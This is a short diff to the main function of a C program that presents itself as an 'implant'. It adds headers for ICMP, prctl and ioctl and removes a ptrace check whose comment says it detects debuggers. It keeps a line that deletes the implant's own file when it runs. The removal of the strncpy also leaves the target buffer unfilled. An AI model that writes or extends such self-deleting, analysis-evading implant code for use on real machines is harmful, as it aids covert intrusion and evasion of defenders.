@@ -1,5 +1,12 @@
 #include "../include/implant.h"
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <linux/icmp.h>
 #include <sys/ptrace.h>
+#include <sys/ioctl.h>
+#include <sys/prctl.h>
 
 int main(int argc, char **argv, char **envp) {
     if (argc < 2) {
@@ -10,13 +17,6 @@ int main(int argc, char **argv, char **envp) {
     const void *empty = NULL;
     size_t ip_len = strlen(argv[1]);
     char target[ip_len];
-
-    // detect if a debugger is used against our implant
-    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
-        return 1;
-    }
-
-    strncpy(target, argv[1], ip_len);
 
     // remove implant upon execution
     unlink(argv[0]);
